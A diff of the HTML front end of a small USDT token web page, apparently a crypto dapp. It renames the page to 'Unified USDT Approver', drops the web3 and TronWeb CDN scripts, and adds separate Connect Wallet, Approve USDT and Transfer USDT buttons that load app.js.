@@ -1,21 +1,18 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>USDT Dapp</title>
-  <link rel="stylesheet" href="style.css"/>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Unified USDT Approver</title>
+    <link rel="stylesheet" href="style.css" />
+    <script defer src="app.js"></script>
 </head>
 <body>
-  <div class="container">
-    <h1>Approve & Send USDT</h1>
-    <p>Connect your wallet to begin</p>
-    <button id="connectBtn">Send USDT</button>
-    <div id="status"></div>
-  </div>
-
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
-  <script src="app.js"></script>
+    <div class="container">
+        <h1>Approve & Transfer USDT</h1>
+        <button id="connectWallet">Connect Wallet</button>
+        <button id="approveUSDT">Approve USDT</button>
+        <button id="transferUSDT">Transfer USDT</button>
+    </div>
 </body>
 </html>
